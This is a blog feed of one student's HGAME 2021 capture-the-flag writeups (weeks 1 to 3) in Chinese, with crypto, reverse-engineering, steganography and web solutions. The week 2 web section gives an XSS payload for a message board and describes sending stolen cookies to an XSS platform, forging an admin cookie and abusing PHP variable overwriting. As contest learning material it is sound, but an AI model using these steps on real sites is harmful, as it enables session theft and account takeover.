class="line">v2[<span class="number">19</span>] = <span class="number">100</span></span><br><span class="line">v2[<span class="number">20</span>] = <span class="number">111</span></span><br><span class="line">v2[<span class="number">21</span>] = <span class="number">95</span></span><br><span class="line">v2[<span class="number">22</span>] = <span class="number">89</span></span><br><span class="line">v2[<span class="number">23</span>] = <span class="number">48</span></span><br><span class="line">v2[<span class="number">24</span>] = <span class="number">117</span></span><br><span class="line">v2[<span class="number">25</span>] = <span class="number">95</span></span><br><span class="line">v2[<span class="number">26</span>] = <span class="number">107</span></span><br><span class="line">v2[<span class="number">27</span>] = <span class="number">111</span></span><br><span class="line">v2[<span class="number">28</span>] = <span class="number">110</span></span><br><span class="line">v2[<span class="number">29</span>] = <span class="number">119</span></span><br><span class="line">v2[<span class="number">30</span>] = <span class="number">95</span></span><br><span class="line">v2[<span class="number">31</span>] = <span class="number">83</span></span><br><span class="line">v2[<span class="number">32</span>] = <span class="number">77</span></span><br><span class="line">v2[<span class="number">33</span>] = <span class="number">67</span></span><br><span class="line">v2[<span class="number">34</span>] = <span class="number">63</span></span><br><span class="line">v2[<span class="number">35</span>] = <span class="number">125</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">6</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">6</span>):</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">6</span>):</span><br><span class="line">            v4[<span class="number">6</span> * i + j] += v2[<span class="number">6</span> * k + j] * a1[<span class="number">6</span> * i + k]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">6</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">6</span>):</span><br><span class="line">        s.add(v4[<span class="number">6</span>*i+j] == v3[<span class="number">6</span> * i + j])</span><br><span class="line"></span><br><span class="line">s.check()</span><br><span class="line">result = s.model()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">36</span>):</span><br><span class="line">     <span class="built_in">print</span>(result[a1[i]], end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Crypto">Crypto</h2><h3 id="1-LikiPrime">1.LikiPrime</h3><p>​还是 RSA，不过素数 N 更大了，但是放到网站里分解还是能分解出 q和 p，之后就是用上周的脚本跑出flag</p><h3 id="2-HappyNewYear">2.HappyNewYear!!</h3><p>​e = 3，发送内容相同，自然就想到低指数广播攻击，但是广播攻击只需要 e组数据，那么猜测给的数据里解出来的明文不是全部相同。</p><p>​低指数广播攻击需要用到中国剩余定理（孙子定理），脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> n2s</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">modinv</span>(<span class="params">a, m</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(gmpy2.invert(gmpy2.mpz(a), gmpy2.mpz(m)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">chinese_remainder</span>(<span class="params">n, a</span>):</span></span><br><span class="line">    <span class="built_in">sum</span> = <span class="number">0</span></span><br><span class="line">    prod = reduce(<span class="keyword">lambda</span> a, b: a * b, n)</span><br><span class="line">    <span class="keyword">for</span> n_i, a_i <span class="keyword">in</span> <span class="built_in">zip</span>(n, a):</span><br><span class="line">        p = prod // n_i</span><br><span class="line">        <span class="built_in">sum</span> += a_i * modinv(p, n_i) * p</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(<span class="built_in">sum</span> % prod)</span><br><span class="line"></span><br><span class="line">n1 = </span><br><span class="line">c1 = </span><br><span class="line"></span><br><span class="line">n2 = </span><br><span class="line">c2 = </span><br><span class="line"></span><br><span class="line">n3 = </span><br><span class="line">c3 = </span><br><span class="line"></span><br><span class="line">n4 = </span><br><span class="line">c4 = </span><br><span class="line"></span><br><span class="line">n5 = </span><br><span class="line">c5 =</span><br><span class="line"></span><br><span class="line">n6 = </span><br><span class="line">c6 = </span><br><span class="line"></span><br><span class="line">n7 = </span><br><span class="line">c7 = </span><br><span class="line"></span><br><span class="line">nset = [n2,n4,n6]</span><br><span class="line">cset = [c2,c4,c6]</span><br><span class="line"></span><br><span class="line">m = chinese_remainder(nset, cset)</span><br><span class="line">m = gmpy2.iroot(m,<span class="number">3</span>)</span><br><span class="line">m = <span class="built_in">int</span>(m[<span class="number">0</span>])</span><br><span class="line"><span class="built_in">print</span>(n2s(m))</span><br></pre></td></tr></table></figure><p>c1,c3,c5 解密得到一个片段，c2,c4,c6解密得到剩下的flag片段（本来写的是随机在给出的7组数据里挑三组解密，但是没跑出结果，后来手动试了一下试出来了）</p><img src="/2021/03/27/HGAME-Week3-Writeup/crypto3(2).jpg" class=""><img src="/2021/03/27/HGAME-Week3-Writeup/crypto3.jpg" class=""><h2 id="Misc">Misc</h2><h3 id="1-A-R-K">1.A R K</h3><p>​打开下载的流量包，首先看到dns里的域名</p><img src="/2021/03/27/HGAME-Week3-Writeup/misc1(5).jpg" class=""><p>​刚开始以为跟网址有关，但后来题目里说 “<strong>本题目所有解题操作均只用流量，与网址无关</strong>” ，那就接着看其他包，查资料知道 TLS 加密尝试找到流量包里的证书</p><img src="/2021/03/27/HGAME-Week3-Writeup/misc1(4).png" class=""><p>​导出原始数据保存为 ssl.log ,再重新导入解密</p><img src="/2021/03/27/HGAME-Week3-Writeup/misc1(6).jpg" class=""><p>​找到解密后的 HTTP 流，导出后得到一堆json文件，导出来后卡了一段时间，之后看到题目的补充信息</p><p>​<code>补充说明：明日方舟是一款塔防游戏，可以将可部署单位放置在场地中。并且具有自律功能，可以记录部署的操作。  翻译：没用 没用 出题人用可部署单位画了个东西 背景是白色的</code></p><p>​<strong>记录部署操作</strong>？！那就打开 getBattleReplay 文件，看到像是 base64 编码的字符串，解码看到 zip 文件头标识另存为 zip，解压打开发现配对的 row 和 col ，应该是部署的坐标，再根据题目里的 <strong>画了个东西</strong> 猜测这些坐标是二维码黑色部分，处理一下再运行脚本</p><img src="/2021/03/27/HGAME-Week3-Writeup/misc1(7).jpg" class=""><p>​扫码得flag</p><img src="/2021/03/27/HGAME-Week3-Writeup/misc1(2).png" class=""><h3 id="2-A-R-C">2.A R C</h3><p>​压缩包加密了，那就先看图片找密码</p><img src="/2021/03/27/HGAME-Week3-Writeup/8558.png" class=""><p>​刚开始误以为 BV 是某种 CTF 中的加密方式，在网上搜索了一圈没有收获，于是去问 Akira 学长 BV 除了 b站BV号还有什么意思，学长的答复是</p><img src="/2021/03/27/HGAME-Week3-Writeup/misc2(5).png" class=""><p>​怎么实现的？查 av号怎样转 bv号后发现 <a href="https://www.zhihu.com/question/381784377/answer/1099438784">https://www.zhihu.com/question/381784377/answer/1099438784</a> 这个回答里的实现方法，根据 <strong>hint1：8558 应该理解成85和58，BV号_是所以图片里的是__</strong>    先对图里的密文进行 base85 解密</p><img src="/2021/03/27/HGAME-Week3-Writeup/misc2.png" class=""><p>​根据长度判断应该是 av号转 bv号算法里的table，那就换一下上面链接里代码的table，密文是压缩包名里的数字，跑一下得到压缩包密码</p><img src="/2021/03/27/HGAME-Week3-Writeup/misc2(2).png" class=""><p>​打开后得到一段 arc 视频和密文，用题目里给的软件播放视频得到</p><img src="/2021/03/27/HGAME-Week3-Writeup/misc2(3).png" class=""><p>​发现图中第一行文字和文本里文字相似，猜测是同种加密方式，之后又没有思路了，hint2里提到 <strong>词频分析是个好东西，别忘了视频里的问题</strong> ，查了下视频里的问题但没什么发现。后来又放出hint <strong>用了某种ROT的范围，但是位移不一样</strong> ，根据两个字符的应该是 is 之类的尝试将每个字符后移10位，得到了一段英文，然后又卡住了。于是又去问 Akira学长，学长说并不是后移10位提示我再想想视频里问题的答案，突然想起之前有查到 42 这个数字，尝试后移42位得到正确的文字</p><img src="/2021/03/27/HGAME-Week3-Writeup/misc2(4).png" class=""><p>​视频里文字第一行也是后移 42位得到 MSU 密码，解密得到的文字里提到视频里第二行的加密方法 Liki学长提到过，根据 week1 crypto的第一题，第二行文字加密方法应该是维吉尼亚，密钥是 Akira</p><p>​在 virtualDub2里安装MSUstego插件，用之前得到的密码对视频进行解密，得到网址、光和对立的名字，访问网站输入用户名和密码</p><img src="/2021/03/27/HGAME-Week3-Writeup/misc2(7).png" class=""><p>​根据hint5: <strong>/ 不是可输入的意思，是网站路径</strong>，想起之前视频解出的第二行还没用上，那就在网站路径后输入解出的明文，得到flag（pm）</p><p>​这周misc虽然难但很有趣，梗挺多的</p><h2 id="总结：">总结：</h2><p>​这周因为跟父母回老家拜年少了很多做题的时间，之后电脑还出了故障重装了系统，下周要专注于re了，不能再靠着 misc 和 crypto 上分了</p><p>接下来是没做出来的部分</p><h3 id="re">re</h3><p>​Gun这道题用查壳工具查得是梆梆免费版加固，想要脱壳，用了很多网上查到的方法但都失败了，问了 Trotsky学长，推荐使用frida-dexdump脱壳，但是因为这道题需要root过的真机（模拟器不行）来进行脱壳，所以最后只能放弃</p><p>​hello_re3我没太搞明白，拖进ida发现应该都是调试信息，mezone学长说要用dbgview看调试信息再定位到程序里，可惜这题是最后一天才做的，最后没时间了，打算看官方writeup再学习一下</p><h3 id="Crypto-2">Crypto</h3><p>​EncryptedChats这题尝试了各种方法去解，还是解不出 a 和 b ，需要的时间都很长，但是 g 挺大（不是2、5这种很小的） a 跟 b 应该是能解出来的…</p>]]></content>
    
    
    <summary type="html">&lt;article class=&quot;message is-info&quot;&gt;&lt;div class=&quot;message-body&quot;&gt;
&lt;p&gt;Week3&lt;/p&gt;
&lt;/div&gt;&lt;/article&gt;</summary>
    
    
    
    <category term="Hgame2021" scheme="https://www.0wl.site/categories/Hgame2021/"/>
    
    
    <category term="hgame" scheme="https://www.0wl.site/tags/hgame/"/>
    
  </entry>
  
  <entry>
    <title>HGAME-Week2-Writeup</title>
    <link href="https://www.0wl.site/2021/03/27/HGAME-Week2-Writeup/"/>
    <id>https://www.0wl.site/2021/03/27/HGAME-Week2-Writeup/</id>
    <published>2021-03-27T06:43:36.000Z</published>
    <updated>2021-11-16T14:53:38.912Z</updated>
    
    <content type="html"><![CDATA[<article class="message is-info"><div class="message-body"><p>Week2</p></div></article><span id="more"></span><h2 id="Web">Web</h2><h3 id="1-LazyDogR4U">1.LazyDogR4U</h3><p>​首先打开题目地址</p><img src="/2021/03/27/HGAME-Week2-Writeup/web1(2).png" class=""><p>​根据题目给的hint，在地址栏后面加上 <strong>/www.zip</strong> 获得网页源码</p><p>​接着打开 lazy.php 和 flag.php 这两个php文件，再根据<strong>变量覆盖</strong>的提示找到漏洞点</p><img src="/2021/03/27/HGAME-Week2-Writeup/web1(3).png" class=""><p>​这里划线处的两个$符号容易导致变量覆盖，那么根据 flag.php 中得到flag的条件就可以进行构造，相当于：          $_SESSSION[username]=admin</p><img src="/2021/03/27/HGAME-Week2-Writeup/web1(4).png" class=""><p>​双写SESSION是因为上面str_replace的过滤</p><img src="/2021/03/27/HGAME-Week2-Writeup/web1.png" class=""><p>​得到flag</p><h3 id="2-Post-to-zuckonit">2.Post to zuckonit</h3><p>​<img src="/2021/03/27/HGAME-Week2-Writeup/web(6).png" class=""></p><p>​点开后发现是留言板，题目也很明确的指出是<strong>xss</strong>，那么就先尝试输入 script，iframe，image</p><p>​输入后发现不管大小写 script 都会被过滤掉，小写的 iframe 会被过滤，image则不会被过滤</p><p>​之后尝试输入 img src=1 onerror = alert(1) ，让错误的图片导致弹窗</p><img src="/2021/03/27/HGAME-Week2-Writeup/web2(6).png" class=""><p>​输出了这么个东西，把这个输入再 post 就会弹窗，成功弹窗之后就是找一个 xss 平台来接受 cookie 信息</p><img src="/2021/03/27/HGAME-Week2-Writeup/web2(4).png" class=""><p>​根据之前的规律 post 平台给的语句，并用脚本得出 md5 验证码提交，接收到 cookie 信息</p><p>脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(s.encode()).hexdigest()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_code</span>():</span></span><br><span class="line">    code = <span class="string">&#x27;XXXXXX&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10000000</span>, <span class="number">99999999</span>):   <span class="comment">#8位md5</span></span><br><span class="line">        <span class="keyword">if</span> md5(<span class="built_in">str</span>(i)).startswith(code):</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">str</span>(i)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(get_code())</span><br></pre></td></tr></table></figure><img src="/2021/03/27/HGAME-Week2-Writeup/web(2).png" class=""><p>​接着就伪造 admin cookie 得到flag</p><img src="/2021/03/27/HGAME-Week2-Writeup/web2.png" class=""><h2 id="Re">Re</h2><h3 id="1-ezApk">1.ezApk</h3><p>​<strong>安卓逆向</strong>，用 jadx 反编译为 java，找到 onClick 事件</p><img src="/2021/03/27/HGAME-Week2-Writeup/re1(4).png" class=""><p>​这条判断语句是关键，在资源文件中找到加密后的 flag 和 key</p><img src="/2021/03/27/HGAME-Week2-Writeup/re1.jpg" class=""><p>​s函数用来加密输入的字符串，转到s函数分析</p><img src="/2021/03/27/HGAME-Week2-Writeup/re1(5).png" class=""><p>​仔细分析后得知是<strong>AES CBC模式</strong>加密，密钥是之前的key经过<strong>sha-256</strong>加密得到的，iv向量则是key经过<strong>MD5</strong>加密得到的，最后将加密结果再进行一次 <strong>base64</strong> 加密得到之前的 flag</p><p>​尝试用在线网站解密，但是网站一般只支持 16 位 iv 值解密，没有别的办法只能东拼西凑写出 java 脚本来解密</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.company;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.Cipher;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.spec.IvParameterSpec;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.spec.SecretKeySpec;</span><br><span class="line"><span class="keyword">import</span> java.security.MessageDigest;</span><br><span class="line"><span class="keyword">import</span> java.security.NoSuchAlgorithmException;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//md5,sha-256加密</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] t(String str, String str2) &#123;</span><br><span class="line">        MessageDigest instance = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            instance = MessageDigest.getInstance(str);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchAlgorithmException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">byte</span>[] bytes = str2.getBytes();</span><br><span class="line">        <span class="keyword">byte</span>[] digest = instance.digest(bytes);</span><br><span class="line">        <span class="keyword">return</span> digest;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//解密</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">desEncrypt</span><span class="params">(String data, <span class="keyword">byte</span>[] key)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[] ivString = t(<span class="string">&quot;MD5&quot;</span>,<span class="string">&quot;A_HIDDEN_KEY&quot;</span>); <span class="comment">//iv向量</span></span><br><span class="line">        <span class="keyword">byte</span>[] iv = ivString;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">byte</span>[] encryp = Base64.getDecoder().decode(data);</span><br><span class="line">            Cipher cipher =           Cipher.getInstance(<span class="string">&quot;AES/CBC/PKCS7Padding&quot;</span>);</span><br><span class="line">            SecretKeySpec keySpec = <span class="keyword">new</span> SecretKeySpec(key, <span class="string">&quot;AES&quot;</span>);</span><br><span class="line">            IvParameterSpec ivSpec = <span class="keyword">new</span> IvParameterSpec(iv);</span><br><span class="line">            cipher.init(Cipher.DECRYPT_MODE, keySpec, ivSpec);</span><br><span class="line">            <span class="keyword">byte</span>[] original = cipher.doFinal(encryp);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> String(original);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String data = <span class="string">&quot;EEB23sI1Wd9Gvhvk1sgWyQZhjilnYwCi5au1guzOaIg5dMAj9qPA7lnIyVoPSdRY&quot;</span>;     <span class="comment">//密文</span></span><br><span class="line">        <span class="keyword">byte</span>[] key =t(<span class="string">&quot;SHA-256&quot;</span>,<span class="string">&quot;A_HIDDEN_KEY&quot;</span>);  <span class="comment">//密钥</span></span><br><span class="line">        String desencrypt = desEncrypt(data, key);</span><br><span class="line">        System.out.println(<span class="string">&quot;解密后:&quot;</span>+desencrypt);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​因为要用到的是AES 256位解密，而 java 本身只支持 128位 AES 解密，所以就要做其他的一些配置才能解密</p><img src="/2021/03/27/HGAME-Week2-Writeup/re1(3).png" class=""><h3 id="2-helloRe2">2.helloRe2</h3><p>​拖进 IDA 分析，乍一看结构有点复杂，password1 的判断在后半部分，而password2 的判断在前半部分，先分析 password1</p><img src="/2021/03/27/HGAME-Week2-Writeup/re2(3).png" class=""><p>​关键部分是这条判断，判断输入的password长度和 password 经过一系列操作后的结果，用 ollydbg 调试并不断猜测，得知这么一系列操作就是判断输入的字符串是否是给出的密文的逆序</p><p>​之后再分析 pwd2</p><img src="/2021/03/27/HGAME-Week2-Writeup/re2.png" class=""><p>​应该又是AES CBC 模式加密，找到 iv 和 密钥，密钥是pwd1经过异或得到，密文是已经给出密文的逆序</p><p>![](D:\HGAME2021\HGAME week2\re2(4).png)</p><img src="/2021/03/27/HGAME-Week2-Writeup/re2(5).png" class=""><p>​解密就用上一题的脚本</p><img src="/2021/03/27/HGAME-Week2-Writeup/re2(1).png" class=""><img src="/2021/03/27/HGAME-Week2-Writeup/re2(6).png" class=""><p>​这里看着像是两次加密，但其实只有一次</p><img src="/2021/03/27/HGAME-Week2-Writeup/re2(2).png" class=""><h3 id="3-fake-debugger-beta">3.fake_debugger beta</h3><p>​nc题目地址，发现只有在 ebx 经过一次转换后与 eax 相等才能继续调试，之后不断调试发现</p><img src="/2021/03/27/HGAME-Week2-Writeup/re3.png" class=""><p>​转换前的 ebx 与 eax 异或后就是 flag 中的字符，那就一个个调试下来得到 flag</p><h2 id="Crypto">Crypto</h2><h3 id="1-gcd-or-more">1.gcd or more?</h3><p>​<img src="/2021/03/27/HGAME-Week2-Writeup/crypto2.png" class=""></p><p>​看着像是RSA，但是e = 2。百度后查到低指数爆破，之后又看到Rabin算法，特征是e = 2 ，那么就用这个脚本解题</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line">e = <span class="number">2</span></span><br><span class="line">p = <span class="number">85228565021128901853314934583129083441989045225022541298550570449389839609019</span></span><br><span class="line">q = <span class="number">111614714641364911312915294479850549131835378046002423977989457843071188836271</span></span><br><span class="line">n = p * q</span><br><span class="line">c = <span class="number">7665003682830666456193894491015989641647854826647177873141984107202099081475984827806007287830472899616818080907276606744467453445908923054975393623509539</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#c= int(open(&#x27;./flag.enc&#x27;,&#x27;rb&#x27;).read().encode(&#x27;hex&#x27;),16)</span></span><br><span class="line">mp = <span class="built_in">pow</span>(c, (p + <span class="number">1</span>) // <span class="number">4</span>, p)</span><br><span class="line">mq = <span class="built_in">pow</span>(c, (q + <span class="number">1</span>) // <span class="number">4</span>, q)</span><br><span class="line">yp = gmpy2.invert(p, q)</span><br><span class="line">yq = gmpy2.invert(q, p)</span><br><span class="line">r = (yp * p * mq + yq * q * mp) % n</span><br><span class="line">rr = n - r</span><br><span class="line">s = (yp * p * mq - yq * q * mp) % n</span><br><span class="line">ss = n - s</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(r)))</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(rr)))</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(s)))</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(ss)))</span><br></pre></td></tr></table></figure><h3 id="2-WhitegiveRSA">2.WhitegiveRSA</h3><p>​<img src="/2021/03/27/HGAME-Week2-Writeup/crypto3(2).png" class=""></p><p>​已知N，那就拿到在线网站里分解出大素数 q 和 p，剩下来都已知就用脚本解密</p><img src="/2021/03/27/HGAME-Week2-Writeup/crypto3.png" class=""><h2 id="Misc">Misc</h2><h3 id="1-Tools">1.Tools</h3><p>​下载解压得到一个压缩包和一张图片，根据题目的 tools 和压缩包名 f5 尝试用 f5 工具破解压缩包密码，破解所需的密码在图片的详细信息中</p><p>​打开加密压缩包后发现一部分二维码和压缩包，接着就是像之前那样找到压缩包名里的工具解密，最终集齐4张二维码碎片，用win10自带的画图工具拼合，扫码得flag</p><img src="/2021/03/27/HGAME-Week2-Writeup/flag.jpg" class=""><h3 id="2-Telegraph：1601-6639-3459-3134-0892">2.Telegraph：1601 6639 3459 3134 0892</h3><p>​题目为音频隐写，又提到听着反胃，于是猜测是<strong>摩斯电码</strong>。听了之后，中间有一段嘀嗒声，这一段就是需要摩斯解密的部分，接着把音频拖到 <strong>Audacity</strong> 里面分析</p><p>​首先看一下频谱图</p><img src="/2021/03/27/HGAME-Week2-Writeup/misc2.png" class=""><p>​得到<strong>850hz</strong>的提示，之后尝试翻译摩斯电码，发现中间有一段无法辨认就想到要滤波，用的是上面的提示</p><img src="/2021/03/27/HGAME-Week2-Writeup/misc2%EF%BC%882%EF%BC%89.png" class=""><p>​窄的是**.**   宽的是**-**  ，翻译后解密就得到flag</p><img src="/2021/03/27/HGAME-Week2-Writeup/misc2%EF%BC%881%EF%BC%89.png" class=""><h3 id="3-Hallucigenia">3.Hallucigenia</h3><p>​只给了一张图，那么就先用 Stegsolve 左右调一下得到二维码</p><img src="/2021/03/27/HGAME-Week2-Writeup/solved.bmp" class=""><p>​扫码得到一串 base64 解码发现最后是 GNP ，根据题目中 **“我们不仅弄错了他的上下，还颠倒了它的左右。” **逆序处理后粘贴到winhex保存为图片</p><img src="/2021/03/27/HGAME-Week2-Writeup/misc3.png" class=""><p>​发现又是上下左右颠倒，倒回来就得flag</p><img src="/2021/03/27/HGAME-Week2-Writeup/hgame.png" class=""><h3 id="4-DNS">4.DNS</h3><p>​流量包分析，筛选 dns 得到一串域名并访问</p><img src="/2021/03/27/HGAME-Week2-Writeup/misc4.png" class=""><p>​抓包得</p><img src="/2021/03/27/HGAME-Week2-Writeup/misc4.jpg" class=""><p>​查一下 SPF 知道是一种 <strong>dns 记录</strong>，那就用在线网站查一下dns记录，得到flag</p><img src="/2021/03/27/HGAME-Week2-Writeup/misc4(1).png" class=""><h2 id="总结：">总结：</h2><p>​这周比较摸鱼，web 能做出两道是因为给了具体的考点，参照往年 writeup 一点点做下来。   re 做了很久，因为之前没有接触过 apk 逆向，对 aes 加密也不太了解，最后能全部做出来真是太好了，逆向的时候果然是要抓重点，解完题后才发现其实挺简单的。 密码学是真不太行，这周 pwn 也基本没看，Misc 倒是做的挺顺畅的，下周要试着把之前的知识捡起来了</p>]]></content>
    
    
    <summary type="html">&lt;article class=&quot;message is-info&quot;&gt;&lt;div class=&quot;message-body&quot;&gt;
&lt;p&gt;Week2&lt;/p&gt;
&lt;/div&gt;&lt;/article&gt;</summary>
    
    
    
    <category term="Hgame2021" scheme="https://www.0wl.site/categories/Hgame2021/"/>
    
    
    <category term="hgame" scheme="https://www.0wl.site/tags/hgame/"/>
    
  </entry>
  
  <entry>
    <title>HGAME-Week1-writeup</title>
    <link href="https://www.0wl.site/2021/03/26/HGAME-Week1-writeup/"/>
    <id>https://www.0wl.site/2021/03/26/HGAME-Week1-writeup/</id>
    <published>2021-03-26T15:52:16.000Z</published>
    <updated>2021-11-16T14:53:22.395Z</updated>
    
    <content type="html"><![CDATA[<article class="message is-info"><div class="message-body"><p>Week1</p></div></article><span id="more"></span><h1><a href="http://1.web">1.web</a></h1><h2 id="1-Hitchhiking-in-the-Galaxy">1.Hitchhiking_in_the_Galaxy</h2><p>​网页f12发现 /HitchhikerGuide.php , 抓包发现 <strong>302</strong>, 于是在 Linux 中用 curl 命令访问这里,发现 <strong>405</strong> 那么就改用 <strong>post</strong> 请求方式</p><img src="/2021/03/26/HGAME-Week1-writeup/web1.png" class=""><p>​刚开始看到这句话后没有一点想法,就去看了看发的学习资料,看到 <strong>user-agent</strong> 后意识到应该是要加这个头 (因为引擎)  , 内容是那串英文</p><img src="/2021/03/26/HGAME-Week1-writeup/web1(2).png" class=""><p>​仅能通过本地访问 , 那么就再加一个 <strong>x-forwarded-for</strong> 头 , 最后说要从茄子学长的网站过来 , 再加一个 <strong>referer</strong> 头,得到 flag</p><img src="/2021/03/26/HGAME-Week1-writeup/web1(3).png" class=""><h2 id="2-watermelon">2.watermelon</h2><p>​打开网页发现是合成大西瓜, 玩了一遍发现要达到2000分才能得到flag, 于是毫不犹豫地抓包(可惜接受不到分数,是为什么我也不清楚)抓包不行那么就只能<strong>修改 js 代码</strong>,然而在我试图修改的过程中发现</p><img src="/2021/03/26/HGAME-Week1-writeup/web2.png" class=""><p>​把网页变成这样就能轻松玩到2000分! 